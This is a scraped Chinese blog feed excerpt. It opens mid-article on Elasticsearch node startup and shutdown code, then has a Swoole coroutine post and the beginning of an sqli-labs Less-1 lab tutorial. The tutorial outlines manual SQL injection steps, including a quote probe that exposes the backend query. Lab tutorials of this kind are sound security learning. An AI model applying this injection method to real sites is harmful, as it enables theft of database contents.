&lt;p&gt;创建节点过程的主要工作是创建各个模块对象和服务对象，&lt;strong&gt;完成 Guice 依赖绑定&lt;/strong&gt;，获取并初始化探测器。&lt;/p&gt;
&lt;p&gt;ModulesBuilder 用于统一管理 Module&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ModulesBuilder modules = new ModulesBuilder();
ClusterModule clusterModule = new ClusterModule(settings, clusterService, clusterPlugins, clusterInfoService);
modules.add(clusterModule);     // 将模块加入管理
//....
// 实例绑定
modules.add(b -&amp;gt; {
        b.bind(Node.class).toInstance(this);
        b.bind(NodeService.class).toInstance(nodeService);
        b.bind(NamedXContentRegistry.class).toInstance(xContentRegistry);
        b.bind(PluginsService.class).toInstance(pluginsService);
        b.bind(Client.class).toInstance(client);
        b.bind(NodeClient.class).toInstance(client);
        b.bind(Environment.class).toInstance(this.environment);
        b.bind(ThreadPool.class).toInstance(threadPool);
        b.bind(NodeEnvironment.class).toInstance(nodeEnvironment);
        // ....
    }
);
injector = modules.createInjector();    // 生成注入器&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;主要的服务类简介如下：&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;9&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;ResourceWatcherService&lt;/td&gt;
&lt;td&gt;通用资源监视服务&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;HttpServerTransport&lt;/td&gt;
&lt;td&gt;HTTP传输服务，提供Rest接口服务&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;SnapshotsService&lt;/td&gt;
&lt;td&gt;快照服务&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;SnapshotShardsService&lt;/td&gt;
&lt;td&gt;负责启动和停止shard级快照&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;IndicesClusterStateService&lt;/td&gt;
&lt;td&gt;根据收到的集群状态信息，处理相关索引&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;Discovery&lt;/td&gt;
&lt;td&gt;集群拓扑管理&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;RoutingService&lt;/td&gt;
&lt;td&gt;处理路由（节点之间迁移shard）&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;ClusterService&lt;/td&gt;
&lt;td&gt;集群管理服务，主要处理集群任务，发布集群状态&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;NodeConnectionsService&lt;/td&gt;
&lt;td&gt;节点连接管理服务&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;MonitorService&lt;/td&gt;
&lt;td&gt;提供进程级、系统级、文件系统和JVM的监控服务&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;GatewayService&lt;/td&gt;
&lt;td&gt;负责集群元数据持久化与恢复&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;SearchService&lt;/td&gt;
&lt;td&gt;处理搜索请求&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;TransportService&lt;/td&gt;
&lt;td&gt;底层传输服务&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;plugins&lt;/td&gt;
&lt;td&gt;插件&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;IndicesService&lt;/td&gt;
&lt;td&gt;负责创建、删除索引等索引操作&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h4 id=&quot;启动节点&quot;&gt;启动节点&lt;/h4&gt;
&lt;p&gt;启动节点的主要工作是启动各个模块的服务对象，服务对象从注入器 &lt;code&gt;injector&lt;/code&gt; 中取出来，然后调用它们的 &lt;code&gt;start&lt;/code&gt; 方法，服务对象的 &lt;code&gt;start&lt;/code&gt; 方法的工作基本是初始化内部数据、创建线程池、启动线程池等，详细的流程留到后面的文章中再介绍。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;injector.getInstance(MappingUpdatedAction.class).setClient(client);
injector.getInstance(IndicesService.class).start();
injector.getInstance(IndicesClusterStateService.class).start();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在启动 Discovery 和 ClusterService 之前，还会调用 validateNodeBeforeAcceptingRequests 方法来检测环境外部，外部环境主要是JVM、操作系统相关参数，将一些影响性能的配置标记为错误以引起用户的重视。&lt;/p&gt;
&lt;h4 id=&quot;环境检测&quot;&gt;环境检测&lt;/h4&gt;
&lt;p&gt;节点的环境检测代码都封装在 BootstrapChecks 类中，BootstrapChecks 类通过责任链模式对十几个检测项进行检测，关于责任链模式可以翻看这篇文章《&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI1NDU0MTE1NA==&amp;amp;mid=2247483778&amp;amp;idx=1&amp;amp;sn=aa816aec86370806ab9ee4b366760bcb&amp;amp;scene=19#wechat_redirect&quot;&gt;设计模式之责任链模式及典型应用&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;这里的责任链模式中的抽象处理者由 BootstrapCheck 接口扮演，它定义了一个处理方法 &lt;code&gt;check&lt;/code&gt;，而每个检查项则是具体处理者，都有对应的一个静态类，具体的检查则在 &lt;code&gt;check&lt;/code&gt; 接口中完成&lt;/p&gt;
&lt;p&gt;以第一个检查项 &quot;堆大小检查&quot; 为例，从 JvmInfo 类中获取配置的堆的初始值和最大值进行比较，不相等则格式化提示信息，最后返回检查结果&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    static class HeapSizeCheck implements BootstrapCheck {
        @Override
        public BootstrapCheckResult check(BootstrapContext context) {
            final long initialHeapSize = getInitialHeapSize();
            final long maxHeapSize = getMaxHeapSize();
            if (initialHeapSize != 0 &amp;amp;&amp;amp; maxHeapSize != 0 &amp;amp;&amp;amp; initialHeapSize != maxHeapSize) {
                final String message = String.format(Locale.ROOT,
                        &quot;initial heap size [%d] not equal to maximum heap size [%d]; &quot; +
                                &quot;this can cause resize pauses and prevents mlockall from locking the entire heap&quot;,
                        getInitialHeapSize(), getMaxHeapSize());
                return BootstrapCheckResult.failure(message);
            } else {
                return BootstrapCheckResult.success();
            }
        }
        long getInitialHeapSize() { 
            return JvmInfo.jvmInfo().getConfiguredInitialHeapSize();
        }
        long getMaxHeapSize() {
            return JvmInfo.jvmInfo().getConfiguredMaxHeapSize();
        }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;把所有检查项的对象添加到一个 List 链中&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;    static List&amp;lt;BootstrapCheck&amp;gt; checks() {
        final List&amp;lt;BootstrapCheck&amp;gt; checks = new ArrayList&amp;lt;&amp;gt;();
        checks.add(new HeapSizeCheck());
        final FileDescriptorCheck fileDescriptorCheck
            = Constants.MAC_OS_X ? new OsXFileDescriptorCheck() : new FileDescriptorCheck();
        checks.add(fileDescriptorCheck);
        checks.add(new MlockallCheck());
        if (Constants.LINUX) {
            checks.add(new MaxNumberOfThreadsCheck());
        }
        if (Constants.LINUX || Constants.MAC_OS_X) {
            checks.add(new MaxSizeVirtualMemoryCheck());
        }
        if (Constants.LINUX || Constants.MAC_OS_X) {
            checks.add(new MaxFileSizeCheck());
        }
        if (Constants.LINUX) {
            checks.add(new MaxMapCountCheck());
        }
        checks.add(new ClientJvmCheck());
        checks.add(new UseSerialGCCheck());
        checks.add(new SystemCallFilterCheck());
        checks.add(new OnErrorCheck());
        checks.add(new OnOutOfMemoryErrorCheck());
        checks.add(new EarlyAccessCheck());
        checks.add(new G1GCCheck());
        checks.add(new AllPermissionCheck());
        return Collections.unmodifiableList(checks);
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;for 循环分别调用 check 方法进行检查，有些检查项检查不通过是可以忽略的，如果有不能忽略的错误则会抛出异常&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;for (final BootstrapCheck check : checks) {
    final BootstrapCheck.BootstrapCheckResult result = check.check(context);
    if (result.isFailure()) {
        if (!(enforceLimits || enforceBootstrapChecks) &amp;amp;&amp;amp; !check.alwaysEnforce()) {
            ignoredErrors.add(result.getMessage());
        } else {
            errors.add(result.getMessage());
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;那么检查项有哪些呢？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;堆大小检查&lt;/code&gt;：如果开启了&lt;code&gt;bootstrap.memory_lock&lt;/code&gt;，则JVM在启动时将锁定堆的初始大小，若配置的初始值与最大值不等，堆变化后无法保证堆都锁定在内存中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;文件描述符检查&lt;/code&gt;：ES进程需要非常多的文件描述符，所以须配置系统的文件描述符的最大数量 &lt;code&gt;ulimit -n 65535&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;内存锁定检查&lt;/code&gt;：ES允许进程只使用物理内存，若使用交换分区可能会带来很多问题，所以最好让ES锁定内存&lt;/li&gt;
&lt;li&gt;&lt;code&gt;最大线程数检查&lt;/code&gt;：ES进程会创建很多线程，这个数最少需2048&lt;/li&gt;
&lt;li&gt;&lt;code&gt;最大虚拟内存检查&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;最大文件大小检查&lt;/code&gt;：段文件和事务日志文件可能会非常大，建议这个数设置为无限&lt;/li&gt;
&lt;li&gt;&lt;code&gt;虚拟内存区域最大数量检查&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;JVM Client模式检查&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;串行收集检查&lt;/code&gt;：ES默认使用 CMS 垃圾回收器，而不是 Serial 收集器&lt;/li&gt;
&lt;li&gt;&lt;code&gt;系统调用过滤器检查&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;OnError与OnOutOfMemoryError检查&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Early-access检查&lt;/code&gt;：ES最好运行在JVM的稳定版本上&lt;/li&gt;
&lt;li&gt;&lt;code&gt;G1GC检查&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;顺便一提，JvmInfo 则是&lt;strong&gt;利用了 JavaSDK 自带的 ManagementFactory 类来获取JVM信息&lt;/strong&gt;的，获取的 JVM 属性如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;long pid;   // 进程ID
String version; // Java版本
String vmName;  // JVM名称
String vmVersion;   // JVM版本
String vmVendor;    // JVM开发商
long startTime;     // 启动时间
long configuredInitialHeapSize; // 配置的堆的初始值
long configuredMaxHeapSize;     // 配置的堆的最大值
Mem mem;            // 内存信息
String[] inputArguments;    // JVM启动时输入的参数
String bootClassPath;
String classPath;   
Map&amp;lt;String, String&amp;gt; systemProperties;   // 系统环境变量
String[] gcCollectors;
String[] memoryPools;
String onError;
String onOutOfMemoryError;
String useCompressedOops;
String useG1GC;     // 是否使用 G1 垃圾回收器
String useSerialGC; // 是否使用 Serial 垃圾回收器&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;keepalive-线程&quot;&gt;keepAlive 线程&lt;/h4&gt;
&lt;p&gt;在启动引导类 Bootstrap 的 start 方法中，启动节点之后还会启动一个 keepAlive 线程&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;private void start() throws NodeValidationException {
    node.start();
    keepAliveThread.start();
}

// CountDownLatch 初始值为 1
private final CountDownLatch keepAliveLatch = new CountDownLatch(1);
Bootstrap() {
    keepAliveThread = new Thread(new Runnable() {
        @Override
        public void run() {
            try {
                keepAliveLatch.await(); // 一直等待直到 CountDownLatch 减为 0
            } catch (InterruptedException e) {
                // bail out
            }
        }
    }, &quot;elasticsearch[keepAlive/&quot; + Version.CURRENT + &quot;]&quot;);
    keepAliveThread.setDaemon(false);   // false 用户线程
    // keep this thread alive (non daemon thread) until we shutdown
    Runtime.getRuntime().addShutdownHook(new Thread() {
        @Override
        public void run() {
            // 当进程收到关闭 SIGTERM 或 SIGINT 信号时，CountDownLatch 减1 
            keepAliveLatch.countDown();
        }
    });
}

if (addShutdownHook) {
    Runtime.getRuntime().addShutdownHook(new Thread() {
        @Override
        public void run() {
            try {
                IOUtils.close(node, spawner);
                LoggerContext context = (LoggerContext) LogManager.getContext(false);
                Configurator.shutdown(context);
            } catch (IOException ex) {
                throw new ElasticsearchException(&quot;failed to stop node&quot;, ex);
            }
        }
    });
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;keepAliveThread 线程本身不做具体的工作。主线程执行完启动流程后会退出，keepAliveThread 线程是唯一的用户线程，&lt;strong&gt;作用是保持进程运行&lt;/strong&gt;。在Java程序中，一个进程至少需要有一个用户线程，当用户线程为零时将退出进程。&lt;/p&gt;
&lt;p&gt;做个试验，将 &lt;code&gt;keepAliveThread.setDaemon(false);&lt;/code&gt; 中的 &lt;code&gt;false&lt;/code&gt; 改为 &lt;code&gt;true&lt;/code&gt;，会发现Elasticsearch启动后马上就停止了&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[2019-01-08T01:28:47,522][INFO ][o.e.n.Node               ] [1yGidog] started
[2019-01-08T01:28:47,525][INFO ][o.e.n.Node               ] [1yGidog] stopping ...&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;关闭节点&quot;&gt;关闭节点&lt;/h4&gt;
&lt;p&gt;关闭的顺序大致为：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;关闭快照和HTTPServer，不再响应用户REST请求&lt;/li&gt;
&lt;li&gt;关闭集群拓扑管理，不再响应ping请求&lt;/li&gt;
&lt;li&gt;关闭网络模块，让节点离线&lt;/li&gt;
&lt;li&gt;执行各个插件的关闭流程&lt;/li&gt;
&lt;li&gt;关闭IndicesService，这期间需要等待释放的资源最多，时间最长&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public static void close(final Exception ex, final Iterable&amp;lt;? extends Closeable&amp;gt; objects) throws IOException {
    Exception firstException = ex;
    for (final Closeable object : objects) {
        try {
            if (object != null) {
                object.close();
            }
        } catch (final IOException | RuntimeException e) {
            if (firstException == null) {
                firstException = e;
            } else {
                firstException.addSuppressed(e);
            }
        }
    }
    // ...
}

private Node stop() {
    if (!lifecycle.moveToStopped()) {
        return this;
    }
    Logger logger = Loggers.getLogger(Node.class, NODE_NAME_SETTING.get(settings));
    logger.info(&quot;stopping ...&quot;);

    injector.getInstance(ResourceWatcherService.class).stop();
    if (NetworkModule.HTTP_ENABLED.get(settings)) {
        injector.getInstance(HttpServerTransport.class).stop();
    }

    injector.getInstance(SnapshotsService.class).stop();
    injector.getInstance(SnapshotShardsService.class).stop();
    // stop any changes happening as a result of cluster state changes
    injector.getInstance(IndicesClusterStateService.class).stop();
    // close discovery early to not react to pings anymore.
    // This can confuse other nodes and delay things - mostly if we're the master and we're running tests.
    injector.getInstance(Discovery.class).stop();
    // we close indices first, so operations won't be allowed on it
    injector.getInstance(RoutingService.class).stop();
    injector.getInstance(ClusterService.class).stop();
    injector.getInstance(NodeConnectionsService.class).stop();
    nodeService.getMonitorService().stop();
    injector.getInstance(GatewayService.class).stop();
    injector.getInstance(SearchService.class).stop();
    injector.getInstance(TransportService.class).stop();

    pluginLifecycleComponents.forEach(LifecycleComponent::stop);
    // we should stop this last since it waits for resources to get released
    // if we had scroll searchers etc or recovery going on we wait for to finish.
    injector.getInstance(IndicesService.class).stop();
    logger.info(&quot;stopped&quot;);

    return this;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;节点的关闭当然没那么简单。更多细节敬请期待。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;参考：&lt;br/&gt;张超.Elasticsearch源码解析与优化实战&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;后记&quot;&gt;后记&lt;/h3&gt;
&lt;p&gt;欢迎评论、转发、分享，您的支持是我最大的动力&lt;/p&gt;
&lt;p&gt;更多内容可访问我的个人博客：http://laijianfeng.org&lt;/p&gt;
&lt;p&gt;关注【小旋锋】微信公众号，及时接收博文推送&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.laijianfeng.org/20180913_001328.png&quot; alt=&quot;关注_小旋锋_微信公众号&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 07 Jan 2019 18:27:00 +0000</pubDate>
<dc:creator>whirlys</dc:creator>
<og:description>本文主要简要介绍Elasticsearch单节点的启动和关闭流程。Elasticsearch版本：6.3.2 相关文章 1、</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/whirly/p/10236827.html</dc:identifier>
</item>
<item>
<title>[Sw] Swoole-4.2.9 可以尝试愉快应用 Swoole 协程了 - 黑眼诗人</title>
<link>http://www.cnblogs.com/farwish/p/10236757.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/farwish/p/10236757.html</guid>
<description>
&lt;p&gt;大家知道 Swoole 提供了方便于服务器、网络编程的模式，简化了多进程编程。&lt;/p&gt;
&lt;p&gt;这直接让 PHP 的运行很容易变成常驻内存的 Server 程序，执行效率上有了数倍的提升。&lt;/p&gt;
&lt;p&gt;但是这一切还没有让人足够兴奋，直到协程的完整支持，也就是说，可以随时随地并发了。&lt;/p&gt;
&lt;p&gt;swoole-4.2.9 及以上，完整支持了 Go + Chan + Defer 编程模式，给了我们在 PHP 上面不一样的体验。&lt;/p&gt;
&lt;p&gt;（协程 Go+Chan+Defer：&lt;a href=&quot;https://wiki.swoole.com/wiki/page/1019.html&quot; target=&quot;_blank&quot;&gt;https://wiki.swoole.com/wiki/page/1019.html&lt;/a&gt;） &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;go ：创建一个协程
chan ：创建一个通道
defer ：延迟任务，在协程退出时执行，先进后出&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;就下面是一段简短的程序，来领略一下什么是随时随的并发：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/598639/201901/598639-20190108004941153-1300773389.png&quot; alt=&quot;&quot; width=&quot;308&quot; height=&quot;287&quot;/&gt;&lt;/p&gt;
&lt;p&gt;默认允许创建的最大协程数是 3000，超过会有提示，随后循环 1w 次，&lt;/p&gt;
&lt;p&gt;循环中使用 go 创建协程，这就创建了 1w 个协程，运行时占用 350M 左右，CPU 5%左右。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/598639/201901/598639-20190108005342083-1055911766.png&quot; alt=&quot;&quot; width=&quot;184&quot; height=&quot;69&quot;/&gt;&lt;/p&gt;

&lt;p&gt;[ 自动开启协程，同步 IO 切换为异步 IO ]&lt;/p&gt;
&lt;p&gt;通过 `php --ri swoole` 查看拓展的一些配置项，enable_coroutine 是默认开启的。&lt;/p&gt;
&lt;p&gt;下面这些回调中会自动创建协程，不需要使用 Coroutine::create( ) 或者 go( ) 创建：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;onWorkerStart&lt;/li&gt;
&lt;li&gt;onConnect&lt;/li&gt;
&lt;li&gt;onOpen&lt;/li&gt;
&lt;li&gt;onReceive&lt;/li&gt;
&lt;li&gt;redis_onReceive&lt;/li&gt;
&lt;li&gt;onPacket&lt;/li&gt;
&lt;li&gt;onRequest&lt;/li&gt;
&lt;li&gt;onMessage&lt;/li&gt;
&lt;li&gt;onPipeMessage&lt;/li&gt;
&lt;li&gt;onClose&lt;/li&gt;
&lt;li&gt;tick/after 定时器&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;（enable_coroutine：&lt;a href=&quot;https://wiki.swoole.com/wiki/page/949.html&quot; target=&quot;_blank&quot;&gt;https://wiki.swoole.com/wiki/page/949.html&lt;/a&gt;）&lt;/p&gt;

&lt;p&gt;Swoole\Runtime::enableCoroutine( ) 作用是将 PHP 提供的 stream、sleep、pdo、mysqli、redis 等功能从同步阻塞切换为协程的异步 IO。&lt;/p&gt;
&lt;p&gt;这样在 go( ) 中的一些函数不一定要使用协程客户端了， 即可以用 sleep 替代 co::sleep( )。&lt;/p&gt;

&lt;p&gt;Happy coding.&lt;/p&gt;
&lt;p&gt;Link： &lt;a href=&quot;https://www.cnblogs.com/farwish/p/10236757.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/farwish/p/10236757.html&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 07 Jan 2019 17:06:00 +0000</pubDate>
<dc:creator>黑眼诗人</dc:creator>
<og:description>大家知道 Swoole 提供了方便于服务器、网络编程的模式，简化了多进程编程。 这直接让 PHP 的运行很容易变成常驻内存的 Server 程序，执行效率上有了数倍的提升。 但是这一切还没有让人足够兴</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/farwish/p/10236757.html</dc:identifier>
</item>
<item>
<title>通过sqli-labs学习sql注入——基础挑战之less1 - 无缘の邂逅#</title>
<link>http://www.cnblogs.com/csyxf/p/10235785.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/csyxf/p/10235785.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;环境准备：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      Phpstudy  （PHP+Apache+Mysql）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      Sql-lab&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;首先了解下基础知识：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;span&gt;URL编码：&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;    因为在浏览器中，当我们访问一个网址的时候，浏览器会自动将用户输入的网址进行URL编码，因为Http协议中参数的传输是&quot;key=value&quot;这种键值对形式的，所以会将“=”，“#”等字常见的字符进行URL编码。等号的URL编码为%23，空格是%20，单引号是%27， 井号是%23，双引号是%22等，(详情可参考&lt;/span&gt;&lt;span&gt;http://www.w3school.com.cn/tags/html_ref_urlencode.html)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;因为涉及到Mysql数据库，在插入数据库语句时会用到Mysql数据库的注释符&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;Mysql支持三种注释方式：&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
&lt;span&gt;   1.从‘#'字符从行尾。

   2.从‘-- '序列到行尾。请注意‘-- '(双破折号)注释风格要求第2个破折号后面至少跟一个空格符(例如空格、tab、换行符(用%20或者+表示空格)等等)。

   3.从/*序列到后面的*/序列。结束序列不一定在同一行中，因此该语法允许注释跨越多行。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt; SQL手工注入的基本流程：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
&lt;span&gt;　1、首先判断是什么类型的注入，有没过滤了关键字，能不能通过加入注释符绕过

　　2、接着获取当前数据库用户，版本，当前连接的数据库等信息。

　　3、然后一般是获取用户账户密码的那个数据库表的信息

　　4、接着获取列信息

　　5、最后就获取数据了&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;为了方便学习查看，可以在源码中的&lt;/strong&gt;&lt;strong&gt;$sql&lt;/strong&gt;&lt;strong&gt;下一句语句写以下&lt;/strong&gt;&lt;strong&gt;php&lt;/strong&gt;&lt;strong&gt;语句（就是输出拿到数据库查询的完整语句是怎么样的）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:php;gutter:true;&quot;&gt;
&lt;span&gt;echo &quot;你的 sql 语句是：&quot;.$sql.&quot;&amp;lt;br&amp;gt;&quot;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;Less-1 -- &lt;/span&gt;&lt;span&gt;GET-Error based - String quotes  (报错型注入)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;首先点开第一个练习，URL为http://192.168.139.131/sqli-lab/Less-1/&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107225843939-1510480811.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;根据提示信息，给URL传入参数，然后查看输入不同的值页面返回的数据的不同&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107230722035-1432204248.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;尝试如果输入的值id不是整数，那么我们可以传入一个非整数来看看，则不会返回数据；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107230744023-1117422786.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;第一步：判断注入点是否存在&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;通过替换id的值可以肯出页面返回的信息是不同的，经尝试所以手贱的尝试添加个引号&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107230827715-1455046778.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;       &lt;span&gt;在参数id后加上引号后发现页面报错，这里可以看到报错信息直接显示在页面上，根据报错信息可以看出数据库是Mysql数据库的。在测试SQL注入时，如果页面上没有很明显的报错信息时，可以将数据包放到Burp中观察返回数据包的大小来判断。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;由上图可以看出报错信息是：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''&lt;span&gt;8&lt;/span&gt;'' LIMIT &lt;span&gt;0&lt;/span&gt;,&lt;span&gt;1&lt;/span&gt;' at line 1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;从报错信息中可以看出来一部分SQL语句：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
&lt;span&gt;’ 8’ ’ LIMIT 0,1
&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在这里的8' 是我们传入的参数，从报错信息大致可以才出来后台SQL语句形式&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
&lt;span&gt;select  XXX, XXX  from users where id='$_GET[id]' limit 0,1
&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;那么结合我们刚刚传入的id值则可以组成的SQL语句大致为：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
&lt;span&gt;select  XXX, XXX  from users where id=' 8’ ' limit 0,1
&lt;/span&gt;
